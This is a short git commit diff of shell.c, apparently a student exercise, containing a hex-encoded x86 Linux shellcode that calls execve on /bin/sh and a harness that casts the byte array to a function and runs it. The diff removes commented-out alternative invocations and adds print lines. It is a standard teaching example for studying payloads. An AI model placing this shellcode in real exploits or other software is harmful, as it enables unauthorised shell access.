934c787b31e9414909926621e458c429eb4e1de4
Isuru Srimal Abeykoon <isuru.srimal258@gmail.com>
2020-03-08 21:55:30 +0530

    Update shell.c

--- shell.c
+++ shell.c
@@ -4,15 +4,9 @@
 char shellcode[]="\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";
 
 int main(){
-
-    /* char *shellcode="\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";
-
-    (*(void(*)()) shellcode)(); */
-
-     /* int *ret;
-    ret = (int)&ret + 2;
-    (*ret) = (int)shellcode;
-  */
+    
+    printf("SHELLCODE\n");
+    printf("A.M.I.S Abeykoon IT17009614");
 
     int(*f)() = (int(*)())shellcode;
     f();
